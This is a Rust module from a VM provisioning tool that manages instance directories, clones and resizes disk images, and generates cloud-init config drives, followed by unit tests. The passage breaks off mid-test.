//! Disk service: instance directories, image cloning, resize, and cloud-init.
//!
//! Each VM instance gets a dedicated directory (`/opt/syfrah/instances/{uuid}/`)
//! containing its rootfs clone, cloud-init disk, serial log, and local metadata.
//! This module handles creating those directories, cloning base images with
//! reflink support, resizing disks when requested, and generating NoCloud
//! config-drive images for cloud-init provisioning.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::Instant;

use serde::{Deserialize, Serialize};
use serde_yaml::Value as YamlValue;
use tracing::{info, warn};

use crate::image::error::ImageError;
use crate::image::types::{CloudInitConfig, InstanceId};

// ---------------------------------------------------------------------------
// InstanceMeta
// ---------------------------------------------------------------------------

/// Metadata persisted alongside a VM instance for debugging and reconnect.
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct InstanceMeta {
    /// Source image name (e.g. `"ubuntu-24.04"`).
    pub image_source: String,
    /// SHA-256 of the base image at clone time.
    pub image_sha: String,
    /// CPU architecture (e.g. `"aarch64"`).
    pub arch: String,
    /// Disk size requested by the user, if any.
    pub requested_disk_size_mb: Option<u32>,
    /// Actual disk size after clone + optional resize.
    pub effective_disk_size_mb: u32,
    /// VM hostname.
    pub hostname: String,
    /// ISO 8601 creation timestamp.
    pub created_at: String,
    /// Human-readable VM name.
    pub vm_name: String,
}

// ---------------------------------------------------------------------------
// InstanceDir
// ---------------------------------------------------------------------------

/// A VM instance directory containing all per-instance artifacts.
///
/// Created once per VM lifecycle and cleaned up on delete.
#[derive(Debug)]
pub struct InstanceDir {
    base_path: PathBuf,
}

impl InstanceDir {
    /// Create a new instance directory under `base/{id}/`.
    ///
    /// Returns an error if the directory already exists or cannot be created.
    pub fn create(base: &Path, id: &InstanceId) -> Result<Self, ImageError> {
        let dir = base.join(id.to_string());
        if dir.exists() {
            return Err(ImageError::DiskCloneFailed {
                reason: format!("instance directory already exists: {}", dir.display()),
            });
        }
        fs::create_dir_all(&dir).map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to create instance dir {}: {e}", dir.display()),
        })?;
        Ok(Self { base_path: dir })
    }

    /// Open an existing instance directory (no creation).
    pub fn open(base: &Path, id: &InstanceId) -> Self {
        Self {
            base_path: base.join(id.to_string()),
        }
    }

    /// Path to the cloned rootfs image.
    pub fn rootfs_path(&self) -> PathBuf {
        self.base_path.join("rootfs.raw")
    }

    /// Path to the cloud-init config-drive image.
    pub fn cloud_init_path(&self) -> PathBuf {
        self.base_path.join("cloud-init.img")
    }

    /// Path to the serial console log.
    pub fn serial_log_path(&self) -> PathBuf {
        self.base_path.join("serial.log")
    }

    /// Path to the JSON metadata file.
    pub fn metadata_path(&self) -> PathBuf {
        self.base_path.join("metadata.json")
    }

    /// Base path of this instance directory.
    pub fn path(&self) -> &Path {
        &self.base_path
    }

    /// Atomically write instance metadata (write to tmp then rename).
    pub fn write_metadata(&self, meta: &InstanceMeta) -> Result<(), ImageError> {
        let target = self.metadata_path();
        let tmp = self.base_path.join("metadata.json.tmp");
        let data = serde_json::to_string_pretty(meta).map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to serialize metadata: {e}"),
        })?;
        let mut f = fs::File::create(&tmp).map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to create temp metadata file: {e}"),
        })?;
        f.write_all(data.as_bytes())
            .map_err(|e| ImageError::DiskCloneFailed {
                reason: format!("failed to write metadata: {e}"),
            })?;
        f.sync_all().map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to sync metadata: {e}"),
        })?;
        fs::rename(&tmp, &target).map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to rename metadata: {e}"),
        })?;
        Ok(())
    }

    /// Read instance metadata from disk.
    pub fn read_metadata(&self) -> Result<InstanceMeta, ImageError> {
        let path = self.metadata_path();
        let data = fs::read_to_string(&path).map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to read metadata {}: {e}", path.display()),
        })?;
        serde_json::from_str(&data).map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to parse metadata: {e}"),
        })
    }

    /// Remove the entire instance directory and all contents.
    pub fn cleanup(&self) -> Result<(), ImageError> {
        if self.base_path.exists() {
            fs::remove_dir_all(&self.base_path).map_err(|e| ImageError::DiskCloneFailed {
                reason: format!(
                    "failed to remove instance dir {}: {e}",
                    self.base_path.display()
                ),
            })?;
        }
        Ok(())
    }

    /// Check whether the instance directory exists on disk.
    pub fn exists(&self) -> bool {
        self.base_path.exists()
    }
}

// ---------------------------------------------------------------------------
// clone_image (#549)
// ---------------------------------------------------------------------------

/// Clone a base image into an instance directory, optionally resizing.
///
/// Steps:
/// 1. Check available disk space (base size + 1 GB buffer).
/// 2. Copy with `cp --reflink=auto` for CoW when available.
/// 3. If `disk_size_mb` is specified and larger than `base_min_disk_mb`,
///    extend the file with `truncate` and grow the filesystem with `resize2fs`.
/// 4. Return the effective disk size in bytes.
///
/// On resize failure the cloned file is removed (compensating cleanup).
pub fn clone_image(
    base_path: &Path,
    instance_dir: &InstanceDir,
    disk_size_mb: Option<u32>,
    base_min_disk_mb: u32,
) -> Result<u64, ImageError> {
    let dest = instance_dir.rootfs_path();

    // -- 1. Preflight: disk space check --------------------------------------
    let base_size = fs::metadata(base_path)
        .map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("cannot stat base image {}: {e}", base_path.display()),
        })?
        .len();

    let required_bytes = base_size + 1_073_741_824; // base + 1 GB buffer
    let available = available_disk_space(instance_dir.path());
    if available < required_bytes {
        return Err(ImageError::InsufficientDiskSpace {
            required_mb: required_bytes / (1024 * 1024),
            available_mb: available / (1024 * 1024),
        });
    }

    // -- 2. Clone with reflink -----------------------------------------------
    let start = Instant::now();
    let cp = Command::new("cp")
        .args([
            "--reflink=auto",
            &base_path.to_string_lossy(),
            &dest.to_string_lossy(),
        ])
        .output()
        .map_err(|e| ImageError::DiskCloneFailed {
            reason: format!("failed to run cp: {e}"),
        })?;

    if !cp.status.success() {
        return Err(ImageError::DiskCloneFailed {
            reason: format!("cp failed: {}", String::from_utf8_lossy(&cp.stderr).trim()),
        });
    }

    let elapsed = start.elapsed();
    let strategy = if elapsed.as_secs() < 1 {
        "reflink (instant)"
    } else {
        "full copy"
    };
    info!(
        path = %dest.display(),
        strategy,
        elapsed_ms = elapsed.as_millis() as u64,
        "image cloned"
    );

    // -- 3. Optional resize --------------------------------------------------
    let effective_size = if let Some(target_mb) = disk_size_mb {
        if target_mb > base_min_disk_mb {
            if let Err(e) = resize_image(&dest, target_mb) {
                // Compensating cleanup: remove the clone
                warn!(path = %dest.display(), "resize failed, removing clone");
                let _ = fs::remove_file(&dest);
                return Err(e);
            }
            info!(
                from_mb = base_min_disk_mb,
                to_mb = target_mb,
                "disk resized"
            );
            u64::from(target_mb) * 1024 * 1024
        } else {
            u64::from(base_min_disk_mb) * 1024 * 1024
        }
    } else {
        u64::from(base_min_disk_mb) * 1024 * 1024
    };

    Ok(effective_size)
}

/// Resize a raw disk image: truncate then resize2fs.
fn resize_image(path: &Path, size_mb: u32) -> Result<(), ImageError> {
    let path_str = path.to_string_lossy();

    // truncate -s {size}M
    let truncate = Command::new("truncate")
        .args(["-s", &format!("{size_mb}M"), &*path_str])
        .output()
        .map_err(|e| ImageError::ResizeFailed {
            reason: format!("failed to run truncate: {e}"),
        })?;

    if !truncate.status.success() {
        return Err(ImageError::ResizeFailed {
            reason: format!(
                "truncate failed: {}",
                String::from_utf8_lossy(&truncate.stderr).trim()
            ),
        });
    }

    // resize2fs (best-effort — may not be installed or FS may not be ext4)
    let resize = Command::new("resize2fs").arg(&*path_str).output();

    match resize {
        Ok(output) if !output.status.success() => {
            warn!(
                stderr = %String::from_utf8_lossy(&output.stderr).trim(),
                "resize2fs failed (non-ext4 or tool issue), truncate already applied"
            );
        }
        Err(e) => {
            warn!(%e, "resize2fs not available, truncate already applied");
        }
        Ok(_) => {
            info!("resize2fs completed successfully");
        }
    }

    Ok(())
}

/// Query available disk space for the filesystem containing `path`.
fn available_disk_space(path: &Path) -> u64 {
    // Use statvfs via libc
    use std::ffi::CString;
    let c_path = match CString::new(path.to_string_lossy().as_bytes()) {
        Ok(p) => p,
        Err(_) => return u64::MAX, // cannot check — assume enough
    };

    unsafe {
        let mut stat: libc::statvfs = std::mem::zeroed();
        if libc::statvfs(c_path.as_ptr(), &mut stat) == 0 {
            #[allow(clippy::unnecessary_cast)]
            let avail = stat.f_bavail as u64;
            #[allow(clippy::unnecessary_cast)]
            let bsize = stat.f_bsize as u64;
            avail * bsize
        } else {
            u64::MAX // cannot check — assume enough
        }
    }
}

// ---------------------------------------------------------------------------
// generate_cloud_init (#550)
// ---------------------------------------------------------------------------

/// Check whether a system tool is available on PATH.
fn tool_available(name: &str) -> bool {
    Command::new("which")
        .arg(name)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Generate a NoCloud config-drive FAT32 image for cloud-init.
///
/// Creates `meta-data`, `user-data`, and optionally `network-config` files,
/// then packages them into a FAT32 image using `mkfs.vfat` + `mcopy`.
///
/// Returns the path to the generated `cloud-init.img` inside the instance dir.
///
/// Requires `mkfs.vfat` (from dosfstools) and `mcopy` (from mtools) to be
/// installed. Returns `CloudInitGenerationFailed` with install instructions
/// if either tool is missing.
pub fn generate_cloud_init(
    config: &CloudInitConfig,
    instance_dir: &InstanceDir,
    instance_id: &InstanceId,
) -> Result<PathBuf, ImageError> {
    // -- Check required tools ------------------------------------------------
    if !tool_available("mkfs.vfat") || !tool_available("mcopy") {
        return Err(ImageError::CloudInitGenerationFailed {
            reason: "mkfs.vfat and mcopy are required; install dosfstools and mtools".to_string(),
        });
    }

    let dest = instance_dir.cloud_init_path();

    // -- Create temp working directory ---------------------------------------
    let work_dir = instance_dir.path().join("cloud-init-tmp");
    fs::create_dir_all(&work_dir).map_err(|e| ImageError::CloudInitGenerationFailed {
        reason: format!("failed to create cloud-init work dir: {e}"),
    })?;

    // Cleanup helper: remove work dir and any partial .img on error
    let cleanup = |work: &Path, img: &Path| {
        let _ = fs::remove_dir_all(work);
        let _ = fs::remove_file(img);
    };

    // -- 1. Write meta-data --------------------------------------------------
    let mut meta_map = serde_yaml::Mapping::new();
    meta_map.insert(
        YamlValue::String("instance-id".to_string()),
        YamlValue::String(instance_id.to_string()),
    );
    meta_map.insert(
        YamlValue::String("local-hostname".to_string()),
        YamlValue::String(config.hostname.clone()),
    );
    let meta_data = serde_yaml::to_string(&meta_map).map_err(|e| {
        cleanup(&work_dir, &dest);
        ImageError::CloudInitGenerationFailed {
            reason: format!("failed to serialize meta-data: {e}"),
        }
    })?;
    let meta_path = work_dir.join("meta-data");
    if let Err(e) = fs::write(&meta_path, &meta_data) {
        cleanup(&work_dir, &dest);
        return Err(ImageError::CloudInitGenerationFailed {
            reason: format!("failed to write meta-data: {e}"),
        });
    }

    // -- 2. Write user-data --------------------------------------------------
    // Build the cloud-config as a structured YAML mapping to prevent injection.
    let mut cloud_cfg = serde_yaml::Mapping::new();

    // Build users list
    let mut users_list: Vec<YamlValue> = Vec::new();

    // Default user
    let mut default_user = serde_yaml::Mapping::new();
    default_user.insert(
        "name".into(),
        YamlValue::String(config.default_user.clone()),
    );
    default_user.insert(
        "sudo".into(),
        YamlValue::String("ALL=(ALL) NOPASSWD:ALL".to_string()),
    );
    default_user.insert("shell".into(), YamlValue::String("/bin/bash".to_string()));
    if !config.ssh_authorized_keys.is_empty() {
        let keys: Vec<YamlValue> = config
            .ssh_authorized_keys
            .iter()
            .map(|k| YamlValue::String(k.clone()))
            .collect();
        default_user.insert("ssh_authorized_keys".into(), YamlValue::Sequence(keys));
    }
    users_list.push(YamlValue::Mapping(default_user));

    // Additional users
    for user in &config.users {
        let mut u = serde_yaml::Mapping::new();
        u.insert("name".into(), YamlValue::String(user.name.clone()));
        if !user.groups.is_empty() {
            u.insert("groups".into(), YamlValue::String(user.groups.join(", ")));
        }
        if let Some(sudo) = &user.sudo {
            u.insert("sudo".into(), YamlValue::String(sudo.clone()));
        }
        if let Some(shell) = &user.shell {
            u.insert("shell".into(), YamlValue::String(shell.clone()));
        }
        users_list.push(YamlValue::Mapping(u));
    }

    cloud_cfg.insert("users".into(), YamlValue::Sequence(users_list));

    // Serialize the structured config, then prepend #cloud-config header.
    let body = serde_yaml::to_string(&cloud_cfg).map_err(|e| {
        cleanup(&work_dir, &dest);
        ImageError::CloudInitGenerationFailed {
            reason: format!("failed to serialize user-data: {e}"),
        }
    })?;
    let mut user_data = format!("#cloud-config\n{body}");

    if let Some(extra) = &config.user_data_extra {
        user_data.push_str(extra);
        if !extra.ends_with('\n') {
            user_data.push('\n');
        }
    }

    let userdata_path = work_dir.join("user-data");
    if let Err(e) = fs::write(&userdata_path, &user_data) {
        cleanup(&work_dir, &dest);
        return Err(ImageError::CloudInitGenerationFailed {
            reason: format!("failed to write user-data: {e}"),
        });
    }

    // -- 3. Optional network-config ------------------------------------------
    let network_path = work_dir.join("network-config");
    let has_network = config.network_config.is_some();
    if let Some(net_cfg) = &config.network_config {
        let yaml = net_cfg.to_yaml();
        if let Err(e) = fs::write(&network_path, &yaml) {
            cleanup(&work_dir, &dest);
            return Err(ImageError::CloudInitGenerationFailed {
                reason: format!("failed to write network-config: {e}"),
            });
        }
    }

    // -- 4. Create FAT32 image -----------------------------------------------
    // truncate -s 1M cloud-init.img
    let truncate = Command::new("truncate")
        .args(["-s", "1M", &dest.to_string_lossy()])
        .output();
    match truncate {
        Ok(out) if !out.status.success() => {
            cleanup(&work_dir, &dest);
            return Err(ImageError::CloudInitGenerationFailed {
                reason: format!(
                    "truncate failed: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                ),
            });
        }
        Err(e) => {
            cleanup(&work_dir, &dest);
            return Err(ImageError::CloudInitGenerationFailed {
                reason: format!("failed to run truncate: {e}"),
            });
        }
        Ok(_) => {}
    }

    // mkfs.vfat -n cidata cloud-init.img
    let mkfs = Command::new("mkfs.vfat")
        .args(["-n", "cidata", &dest.to_string_lossy()])
        .output();
    match mkfs {
        Ok(out) if !out.status.success() => {
            cleanup(&work_dir, &dest);
            return Err(ImageError::CloudInitGenerationFailed {
                reason: format!(
                    "mkfs.vfat failed: {}",
                    String::from_utf8_lossy(&out.stderr).trim()
                ),
            });
        }
        Err(e) => {
            cleanup(&work_dir, &dest);
            return Err(ImageError::CloudInitGenerationFailed {
                reason: format!("failed to run mkfs.vfat: {e}"),
            });
        }
        Ok(_) => {}
    }

    // mcopy files into the image
    let files_to_copy: Vec<(&Path, &str)> = {
        let mut v: Vec<(&Path, &str)> = vec![
            (meta_path.as_path(), "meta-data"),
            (userdata_path.as_path(), "user-data"),
        ];
        if has_network {
            v.push((network_path.as_path(), "network-config"));
        }
        v
    };

    for (src, name) in &files_to_copy {
        let mcopy = Command::new("mcopy")
            .args([
                "-i",
                &dest.to_string_lossy(),
                &src.to_string_lossy(),
                &format!("::{name}"),
            ])
            .output();
        match mcopy {
            Ok(out) if !out.status.success() => {
                cleanup(&work_dir, &dest);
                return Err(ImageError::CloudInitGenerationFailed {
                    reason: format!(
                        "mcopy {name} failed: {}",
                        String::from_utf8_lossy(&out.stderr).trim()
                    ),
                });
            }
            Err(e) => {
                cleanup(&work_dir, &dest);
                return Err(ImageError::CloudInitGenerationFailed {
                    reason: format!("failed to run mcopy for {name}: {e}"),
                });
            }
            Ok(_) => {}
        }
    }

    // -- 5. Clean up work dir ------------------------------------------------
    let _ = fs::remove_dir_all(&work_dir);

    info!(
        path = %dest.display(),
        instance_id = %instance_id,
        hostname = %config.hostname,
        has_network_config = has_network,
        ssh_keys = config.ssh_authorized_keys.len(),
        "cloud-init config-drive generated"
    );

    Ok(dest)
}

// ---------------------------------------------------------------------------
// Network config v2 (#755)
// ---------------------------------------------------------------------------

/// Generate a cloud-init network config v2 YAML string.
///
/// Produces a NoCloud-compatible `network-config` file with a single ethernet
/// interface (`eth0`) configured with the given IP, gateway, DNS servers, and
/// MTU. The MTU is set to 1350 to account for VXLAN (50 bytes) + WireGuard
/// (80 bytes) overhead on the standard 1500 MTU path.
pub fn generate_network_config(ip: &str, prefix_len: u8, gateway: &str, mtu: u16) -> String {
    let mut root = serde_yaml::Mapping::new();

    let mut eth0 = serde_yaml::Mapping::new();
    eth0.insert(
        "addresses".into(),
        YamlValue::Sequence(vec![YamlValue::String(format!("{ip}/{prefix_len}"))]),
    );
    eth0.insert("gateway4".into(), YamlValue::String(gateway.to_string()));

    let mut nameservers = serde_yaml::Mapping::new();
    nameservers.insert(
        "addresses".into(),
        YamlValue::Sequence(vec![
            YamlValue::String("8.8.8.8".to_string()),
            YamlValue::String("1.1.1.1".to_string()),
        ]),
    );
    eth0.insert("nameservers".into(), YamlValue::Mapping(nameservers));
    eth0.insert(
        "mtu".into(),
        YamlValue::Number(serde_yaml::Number::from(mtu)),
    );

    let mut ethernets = serde_yaml::Mapping::new();
    ethernets.insert("eth0".into(), YamlValue::Mapping(eth0));

    let mut network = serde_yaml::Mapping::new();
    network.insert(
        "version".into(),
        YamlValue::Number(serde_yaml::Number::from(2u64)),
    );
    network.insert("ethernets".into(), YamlValue::Mapping(ethernets));

    root.insert("network".into(), YamlValue::Mapping(network));

    serde_yaml::to_string(&root).expect("network config serialization cannot fail")
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use crate::image::types::CloudInitNetworkConfig;
    use std::fs;
    use tempfile::TempDir;

    fn sample_meta() -> InstanceMeta {
        InstanceMeta {
            image_source: "ubuntu-24.04".to_string(),
            image_sha: "abc123".to_string(),
            arch: "aarch64".to_string(),
            requested_disk_size_mb: Some(20480),
            effective_disk_size_mb: 20480,
            hostname: "vm-web-1".to_string(),
            created_at: "2025-06-01T12:00:00Z".to_string(),
            vm_name: "web-1".to_string(),
        }
    }

    fn minimal_cloud_init_config() -> CloudInitConfig {
        CloudInitConfig {
            hostname: "vm-test-1".to_string(),
            ssh_authorized_keys: vec!["ssh-ed25519 AAAA... user@host".to_string()],
            default_user: "ubuntu".to_string(),
            users: vec![],
            network_config: None,
            user_data_extra: None,
        }
    }

    fn has_tool(name: &str) -> bool {
        tool_available(name)
    }

    // ========================================================================
    // 1. InstanceDir tests (#548 / #551)
    // ========================================================================

    #[test]
    fn create_instance_dir_and_verify_paths() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        assert!(dir.exists());
        assert!(dir.path().ends_with(id.to_string()));
        assert_eq!(dir.rootfs_path(), dir.path().join("rootfs.raw"));
        assert_eq!(dir.cloud_init_path(), dir.path().join("cloud-init.img"));
        assert_eq!(dir.serial_log_path(), dir.path().join("serial.log"));
        assert_eq!(dir.metadata_path(), dir.path().join("metadata.json"));
    }

    #[test]
    fn double_create_returns_error() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let _dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let result = InstanceDir::create(tmp.path(), &id);
        assert!(result.is_err());
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("already exists"));
    }

    #[test]
    fn metadata_roundtrip() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        let meta = sample_meta();
        dir.write_metadata(&meta).unwrap();
        let back = dir.read_metadata().unwrap();
        assert_eq!(meta, back);
    }

    #[test]
    fn metadata_atomic_write_no_tmp_left() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        let meta = InstanceMeta {
            image_source: "alpine".to_string(),
            image_sha: "def456".to_string(),
            arch: "x86_64".to_string(),
            requested_disk_size_mb: None,
            effective_disk_size_mb: 512,
            hostname: "vm-test".to_string(),
            created_at: "2025-06-01T12:00:00Z".to_string(),
            vm_name: "test".to_string(),
        };

        dir.write_metadata(&meta).unwrap();

        // The .tmp file should not exist after a successful write
        assert!(!dir.path().join("metadata.json.tmp").exists());
        assert!(dir.metadata_path().exists());
    }

    #[test]
    fn cleanup_removes_everything() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        // Write some files
        fs::write(dir.rootfs_path(), b"fake image").unwrap();
        fs::write(dir.serial_log_path(), b"boot log").unwrap();

        let path = dir.path().to_path_buf();
        dir.cleanup().unwrap();
        assert!(!path.exists());
    }

    #[test]
    fn cleanup_nonexistent_is_ok() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::open(tmp.path(), &id);
        assert!(dir.cleanup().is_ok());
    }

    #[test]
    fn exists_false_before_create() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::open(tmp.path(), &id);
        assert!(!dir.exists());
    }

    // ========================================================================
    // 2. Clone tests (#549 / #551)
    // ========================================================================

    #[test]
    fn clone_small_file_preserves_content() {
        let tmp = TempDir::new().unwrap();
        let base = tmp.path().join("base.raw");

        // Create a 1 MB base image with a recognizable pattern
        let data: Vec<u8> = (0..1024 * 1024).map(|i| (i % 256) as u8).collect();
        fs::write(&base, &data).unwrap();

        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        let effective = clone_image(&base, &dir, None, 1).unwrap();
        assert_eq!(effective, 1024 * 1024); // 1 MB in bytes

        let cloned = fs::read(dir.rootfs_path()).unwrap();
        assert_eq!(data, cloned);
    }

    #[test]
    fn clone_with_resize_truncate() {
        let tmp = TempDir::new().unwrap();
        let base = tmp.path().join("base.raw");

        // Create a small base image
        fs::write(&base, vec![0u8; 1024 * 1024]).unwrap();

        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        // Request 2 MB, base min is 1 MB -> should resize
        let effective = clone_image(&base, &dir, Some(2), 1).unwrap();
        assert_eq!(effective, 2 * 1024 * 1024);

        // Verify file was truncated to at least 2 MB
        let size = fs::metadata(dir.rootfs_path()).unwrap().len();
        assert!(size >= 2 * 1024 * 1024);
    }

    #[test]
    fn clone_without_resize_when_target_smaller() {
        let tmp = TempDir::new().unwrap();
        let base = tmp.path().join("base.raw");
        fs::write(&base, vec![0u8; 1024]).unwrap();

        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        // Request 5 MB but base_min is 10 MB -> no resize
        let effective = clone_image(&base, &dir, Some(5), 10).unwrap();
        assert_eq!(effective, 10 * 1024 * 1024);
    }

    #[test]
    fn clone_cleanup_on_resize_failure() {
        let tmp = TempDir::new().unwrap();
        let base = tmp.path().join("base.raw");
        fs::write(&base, vec![0u8; 1024]).unwrap();

        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        // Make rootfs path a directory so cp will fail
        fs::create_dir_all(dir.rootfs_path()).unwrap();

        let result = clone_image(&base, &dir, Some(100), 1);
        assert!(result.is_err());
    }

    #[test]
    fn clone_base_not_found() {
        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();

        let result = clone_image(Path::new("/nonexistent/base.raw"), &dir, None, 1);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("cannot stat"));
    }

    #[test]
    fn instance_meta_serde_roundtrip() {
        let meta = InstanceMeta {
            image_source: "debian-12".to_string(),
            image_sha: "aabbccdd".to_string(),
            arch: "x86_64".to_string(),
            requested_disk_size_mb: None,
            effective_disk_size_mb: 4096,
            hostname: "db-primary".to_string(),
            created_at: "2025-07-01T00:00:00Z".to_string(),
            vm_name: "db-primary".to_string(),
        };

        let json = serde_json::to_string(&meta).unwrap();
        let back: InstanceMeta = serde_json::from_str(&json).unwrap();
        assert_eq!(meta, back);
    }

    // ========================================================================
    // 3. Cloud-init tests (#550 / #551)
    // ========================================================================

    #[test]
    fn cloud_init_tools_missing_returns_helpful_error() {
        // If both tools are available this test verifies the happy path
        // does not produce the error; if missing it verifies the message.
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            let tmp = TempDir::new().unwrap();
            let id = InstanceId::new();
            let dir = InstanceDir::create(tmp.path(), &id).unwrap();
            let config = minimal_cloud_init_config();

            let result = generate_cloud_init(&config, &dir, &id);
            assert!(result.is_err());
            let msg = result.unwrap_err().to_string();
            assert!(msg.contains("dosfstools"));
            assert!(msg.contains("mtools"));
        }
    }

    #[test]
    fn cloud_init_generates_nonempty_image() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = minimal_cloud_init_config();

        let path = generate_cloud_init(&config, &dir, &id).unwrap();
        assert!(path.exists());
        let size = fs::metadata(&path).unwrap().len();
        assert!(size > 0, "cloud-init.img should be non-empty");
        // FAT32 1M image
        assert_eq!(size, 1024 * 1024);
    }

    #[test]
    fn cloud_init_meta_data_contains_instance_id_and_hostname() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = minimal_cloud_init_config();

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();

        // Extract meta-data using mcopy
        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::meta-data",
                &extract_dir.join("meta-data").to_string_lossy(),
            ])
            .output()
            .unwrap();
        assert!(out.status.success(), "mcopy extract failed");

        let content = fs::read_to_string(extract_dir.join("meta-data")).unwrap();
        assert!(content.contains(&id.to_string()));
        assert!(content.contains("vm-test-1"));
    }

    #[test]
    fn cloud_init_user_data_contains_ssh_key() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = minimal_cloud_init_config();

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();

        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::user-data",
                &extract_dir.join("user-data").to_string_lossy(),
            ])
            .output()
            .unwrap();
        assert!(out.status.success());

        let content = fs::read_to_string(extract_dir.join("user-data")).unwrap();
        assert!(content.contains("#cloud-config"));
        assert!(content.contains("ssh-ed25519"));
        assert!(content.contains("ubuntu"));
    }

    #[test]
    fn cloud_init_without_ssh_key() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = CloudInitConfig {
            hostname: "no-ssh-vm".to_string(),
            ssh_authorized_keys: vec![],
            default_user: "admin".to_string(),
            users: vec![],
            network_config: None,
            user_data_extra: None,
        };

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();
        assert!(img_path.exists());

        // Verify user-data does not contain ssh_authorized_keys section
        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::user-data",
                &extract_dir.join("user-data").to_string_lossy(),
            ])
            .output()
            .unwrap();
        assert!(out.status.success());

        let content = fs::read_to_string(extract_dir.join("user-data")).unwrap();
        assert!(content.contains("#cloud-config"));
        assert!(!content.contains("ssh_authorized_keys"));
    }

    #[test]
    fn cloud_init_without_network_config() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = minimal_cloud_init_config();

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();

        // Trying to extract network-config should fail (file not on disk)
        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::network-config",
                &extract_dir.join("network-config").to_string_lossy(),
            ])
            .output()
            .unwrap();
        // mcopy should fail because network-config was not written
        assert!(!out.status.success());
    }

    #[test]
    fn cloud_init_with_network_config() {
        if !has_tool("mkfs.vfat") || !has_tool("mcopy") {
            eprintln!("SKIP: mkfs.vfat/mcopy not available");
            return;
        }

        let tmp = TempDir::new().unwrap();
        let id = InstanceId::new();
        let dir = InstanceDir::create(tmp.path(), &id).unwrap();
        let config = CloudInitConfig {
            hostname: "net-vm".to_string(),
            ssh_authorized_keys: vec![],
            default_user: "ubuntu".to_string(),
            users: vec![],
            network_config: Some(CloudInitNetworkConfig {
                ip: "10.0.1.5".to_string(),
                prefix_len: 24,
                gateway: "10.0.1.1".to_string(),
                mtu: 1500,
                dns: vec!["8.8.8.8".to_string()],
            }),
            user_data_extra: None,
        };

        let img_path = generate_cloud_init(&config, &dir, &id).unwrap();

        let extract_dir = tmp.path().join("extract");
        fs::create_dir_all(&extract_dir).unwrap();
        let out = Command::new("mcopy")
            .args([
                "-i",
                &img_path.to_string_lossy(),
                "::network-config",
                &extract_dir.join("network-config").to_string_lossy(),
            ])
            .output()
            .unwrap();
